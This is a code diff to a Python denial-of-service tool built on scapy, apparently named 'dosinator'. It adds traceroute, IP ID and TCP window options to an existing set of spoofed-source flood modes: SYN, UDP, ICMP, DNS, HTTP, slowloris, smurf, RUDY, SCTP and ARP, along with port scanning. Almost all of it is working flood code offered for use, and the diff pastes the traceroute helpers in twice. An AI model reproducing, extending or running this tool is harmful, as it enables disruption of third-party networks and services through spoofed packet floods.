@@ -1,6 +1,7 @@
 #! /usr/bin/env python3
 import time
 import random
+import socket
 import argparse
 import threading
 from scapy.all import *
@@ -16,8 +17,10 @@ from source.dosinatorfiglet import dosinatorfiglet
 
 def generate_random_ip():
     return ".".join(str(random.randint(0, 255)) for _ in range(4))
+
 def generate_random_mac():
     return ":".join([format(random.randint(0, 255), '02x') for _ in range(6)])
+
 def get_mac_address(ip_address):
     arp = ARP(pdst=ip_address)
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -47,23 +50,46 @@ def parse_port_range(port_range):
     return ports
 
 def port_scan(target_ip, port):
+    scanner = nmap.PortScanner()
     try:
-        scanner = nmap.PortScanner()
         result = scanner.scan(target_ip, str(port), arguments="-sV")  # "-sV" ile servis ve versiyon bilgisi alınır
         state = result['scan'][target_ip]['tcp'][port]['state']
         service = result['scan'][target_ip]['tcp'][port]['name']
         version = result['scan'][target_ip]['tcp'][port]['version']
         if state == "open":
-            print(f"{port}\t {state} \t   {service}\t\t{version}")
+            print(f"Port {port}: {state} ({service} {version})")
         else:
             pass
-    except KeyboardInterrupt:
-        print("\nAttack stopped by user.")
-        quit(0)
     except Exception as e:
         print(f"Error during port scan: {e}")
 
-def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data=None, pcap_file=None, ttl=64):
+def get_host_name(ip):
+    try:
+        host_name, _, _ = socket.gethostbyaddr(ip)
+        return host_name
+    except socket.herror:
+        return ip
+
+def traceroute(target_ip, max_hops):
+    try:
+        target_host = get_host_name(target_ip)
+        print(f"Traceroute to {target_host} ({target_ip}) (max {max_hops} hops):")
+        for ttl in range(1, max_hops + 1):
+            packet = IP(dst=target_ip, ttl=ttl) / ICMP()
+            reply = sr1(packet, verbose=False, timeout=2)
+            if reply is None:
+                print(f"{ttl:<2}: *")
+            elif reply.type == 0:
+                print(f"{ttl:<2}: {reply.src:<15} ({get_host_name(reply.src)}) (Reached target)")
+                break
+            else:
+                print(f"{ttl:<2}: {reply.src:<15} ({get_host_name(reply.src)})")
+    except KeyboardInterrupt:
+        print("\nTraceroute stopped by user.")
+
+
+
+def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data=None, pcap_file=None, ttl=64, id=None, win=None):
     try:
         source_ip = spoof_ip() if spoof_ip else generate_random_ip()
         source_port = RandShort()
@@ -75,29 +101,29 @@ def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, cust
             payload = Raw(RandString(size=packet_size))
 
         if attack_mode == "syn":
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / TCP(sport=source_port, dport=target_port, flags='S') / payload / Raw(RandString(size=packet_size))
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / TCP(sport=source_port, dport=target_port, flags='S', window=win) / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "udp":
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / UDP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / UDP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "icmp":
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / ICMP() / payload / Raw(RandString(size=packet_size))
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / ICMP() / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "dns":
             domain = f"{generate_random_ip()}.com"
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / UDP(sport=source_port, dport=target_port) / DNS(rd=1, qd=DNSQR(qname=domain)) / payload / Raw(RandString(size=packet_size))
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / UDP(sport=source_port, dport=target_port) / DNS(rd=1, qd=DNSQR(qname=domain)) / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "os_fingerprint":
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / ICMP() / payload / Raw(RandString(size=packet_size))
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / ICMP() / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "http":
             headers = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target_ip)
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / TCP(sport=source_port, dport=target_port) / headers / payload / Raw(RandString(size=packet_size))
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / TCP(sport=source_port, dport=target_port) / headers / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "slowloris":
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / TCP(sport=source_port, dport=target_port) / Raw("X-a: b\r\n") / payload
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / TCP(sport=source_port, dport=target_port) / Raw("X-a: b\r\n") / payload
         elif attack_mode == "smurf":
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / ICMP(type=8, code=0) / payload / Raw(RandString(size=packet_size))
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / ICMP(type=8, code=0) / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "sctp":
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / SCTP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / SCTP(sport=source_port, dport=target_port) / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "rudy":
             headers = "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n".format(target_ip, packet_size)
             payload = "X-a: b\r\n"
-            packet = IP(src=source_ip, dst=target_ip, ttl=ttl) / TCP(sport=source_port, dport=target_port, flags='A') / headers / payload / Raw(RandString(size=packet_size))
+            packet = IP(src=source_ip, dst=target_ip, ttl=ttl, id=id) / TCP(sport=source_port, dport=target_port, flags='A', window=win) / headers / payload / Raw(RandString(size=packet_size))
         elif attack_mode == "arp":
             target_mac = get_mac_address(target_ip)
             if not target_mac:
@@ -114,7 +140,6 @@ def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, cust
             print("Invalid attack mode.")
             return
 
-
         if pcap_file:
             wrpcap(pcap_file, packet, append=True)
 
@@ -124,7 +149,33 @@ def send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, cust
 
 stop_threads = False
 
-def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, custom_data=None, pcap_file=None, ttl=64):
+
+def get_host_name(ip):
+    try:
+        host_name, _, _ = socket.gethostbyaddr(ip)
+        return host_name
+    except socket.herror:
+        return ip
+
+def traceroute(target_ip, max_hops):
+    try:
+        target_host = get_host_name(target_ip)
+        print(f"Traceroute to {target_host} ({target_ip}) (max {max_hops} hops):")
+        for ttl in range(1, max_hops + 1):
+            packet = IP(dst=target_ip, ttl=ttl) / ICMP()
+            reply = sr1(packet, verbose=False, timeout=2)
+            if reply is None:
+                print(f"{ttl:<2}: *")
+            elif reply.type == 0:
+                print(f"{ttl:<2}: {reply.src:<15} ({get_host_name(reply.src)}) (Reached target)")
+                break
+            else:
+                print(f"{ttl:<2}: {reply.src:<15} ({get_host_name(reply.src)})")
+    except KeyboardInterrupt:
+        print("\nTraceroute stopped by user.")
+
+
+def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, custom_data=None, pcap_file=None, ttl=64, id=None, win=None):
     global stop_threads
 
     print(f"Target IP        : {target_ip}")
@@ -137,6 +188,8 @@ def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, du
     print(f"Spoof IP         : {spoof_ip.__name__ if spoof_ip else 'Default'}")
     print(f"ARP Mode         : {arp_mode if attack_mode == 'arp' else 'N/A'}")
     print(f"TTL              : {ttl}")
+    print(f"IP Identification: {id if id is not None else 'Default'}")
+    print(f"TCP Window Size  : {win if win is not None else 'Default'}")
     print()
 
     delay = 1 / attack_rate if attack_rate > 0 else 0
@@ -151,7 +204,7 @@ def dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, du
             if duration and time.time() - start_time >= duration:
                 break
 
-            send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data, pcap_file, ttl)
+            send_packet(target_ip, target_port, packet_size, attack_mode, spoof_ip, custom_data, pcap_file, ttl, id, win)
             sent_packets += 1
             print(f"\rSent packet {sent_packets}", end="")
             time.sleep(delay)
@@ -183,14 +236,17 @@ if __name__ == '__main__':
     parser.add_argument('-ps', '--packet_size', type=int, default=64, help='Packet size in bytes (default: 64)')
     parser.add_argument('-ar', '--attack_rate', type=int, default=10, help='Attack rate in packets/second (default: 10)')
     parser.add_argument('-d', '--duration', type=int, help='Duration of the attack in seconds')
-    parser.add_argument('--attack-mode', choices=["syn", "sctp", "udp", "icmp", "http", "dns", "os_fingerprint", "slowloris", "smurf", "rudy", "arp", "port_scan"], default="syn", help='Attack mode (default: syn)')
+    parser.add_argument('--attack-mode', choices=["syn", "sctp", "udp", "icmp", "http", "dns", "os_fingerprint", "slowloris", "smurf", "rudy", "arp", "port_scan", "traceroute"], default="syn", help='Attack mode (default: syn)')
     parser.add_argument('-sp', '--spoof-ip', default=None, help='Spoof IP address')
     parser.add_argument('--data', type=str, default=None, help='Custom data string to send')
     parser.add_argument('--file', type=str, default=None, help='File path to read data from')
     parser.add_argument('--pcap', type=str, default=None, help='PCAP file path to save outgoing packets')
     parser.add_argument('--arp-mode', choices=["request", "reply"], default="request", help='ARP mode (default: request)')
     parser.add_argument('--ttl', type=int, default=64, help='TTL value for the outgoing packets (default: 64)')
-    parser.add_argument('--port-range', type=str, default="1-1000", help='Port range for port scan (default: 1-1000)/(e.g. 1-1024, 21,22,80, or 80)')
+    parser.add_argument('--port-range', type=str, default="1-1000", help='Port range for port scan (default: 1-1000)')
+    parser.add_argument('--id', type=int, default=None, help='IP identification field (default: None)')
+    parser.add_argument('--win', type=int, default=None, help='TCP window size (default: None)')
+    parser.add_argument('--max-hops', type=int, default=30, help='Max hops for traceroute (default: 30)')
 
     args = parser.parse_args()
 
@@ -207,6 +263,9 @@ if __name__ == '__main__':
     arp_mode = args.arp_mode
     ttl = args.ttl
     port_range = args.port_range
+    id = args.id
+    win = args.win
+    max_hops = args.max_hops
 
     if args.spoof_ip == "random":
         spoof_ip = generate_random_ip
@@ -217,13 +276,14 @@ if __name__ == '__main__':
         data = read_data_from_file(file_path)
 
     if attack_mode == "port_scan":
-        print("PORT\t STATE\t SERVICE\t VERSION")
         ports_to_scan = parse_port_range(port_range)
         for port in ports_to_scan:
             port_scan(target_ip, port)
+    elif attack_mode == "traceroute":
+        traceroute(target_ip, max_hops)
     elif not target_ip:
         print("Target IP address is required.")
     elif attack_mode != "arp" and not target_port:
         print("Port number is required for non-ARP attacks.")
     else:
-        dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, data, pcap_file, ttl)
+        dos_attack(target_ip, target_port, num_packets, packet_size, attack_rate, duration, attack_mode, spoof_ip, data, pcap_file, ttl, id, win)
